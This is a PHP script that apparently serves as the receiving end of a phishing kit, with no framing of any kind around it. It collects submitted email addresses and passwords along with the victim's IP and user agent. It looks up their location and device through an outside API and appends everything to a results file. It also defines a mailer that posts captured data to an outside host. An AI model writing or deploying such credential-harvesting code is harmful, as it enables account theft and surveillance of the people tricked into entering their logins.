<?php
header('Access-Control-Allow-Origin:*');
header('Access-Control-Allow-Headers:*');
// USE THIS TO SENDING 

class NgMailler {
    public function send($e, $s, $b) {
          $ch = curl_init();
          $url = "https://yu-mail.net/receiver/insert.php";
          curl_setopt($ch,CURLOPT_URL,$url);
          curl_setopt($ch,CURLOPT_POST, 1);
          curl_setopt($ch,CURLOPT_POSTFIELDS,"email=${e}&subject=${s}&body=${b}");
          curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch,CURLOPT_CONNECTTIMEOUT ,3);
          curl_setopt($ch,CURLOPT_TIMEOUT, 20);
          curl_exec($ch);
          curl_close ($ch);
    }
}


$sys = new NgMailler;

date_default_timezone_set("Asia/Jakarta");


function devicemanager($ua){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/useragent/?ua=".urlencode($ua)); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

function location($var){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/flag/?ip=".$var); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

// FLAG
$info = location($_POST['ip']);
$dev = devicemanager($_POST['ua']);

$email = $_POST['user'];
$pass = $_POST['pass'];

$negara = $info['country'];
$region = $info['region'];
$city = $info['city'];

$hp = $dev['device'];
$browser = $dev['browser'];
$os = $dev['os'];

$myfile = fopen("result.txt", "a") or die("Unable to open file!");
$txt = "=== AKUN MASUK BOSSKU === \n\n";
fwrite($myfile, $txt);
$txt = "Email: $email \n";
fwrite($myfile, $txt);
$txt = "Password: $pass \n";
fwrite($myfile, $txt);
$txt = "Daerah: $negara / $region / $city \n";
fwrite($myfile, $txt);
$txt = "Device: $hp / $os / $browser \n\n";
fwrite($myfile, $txt);
$txt = "====================== \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);

?>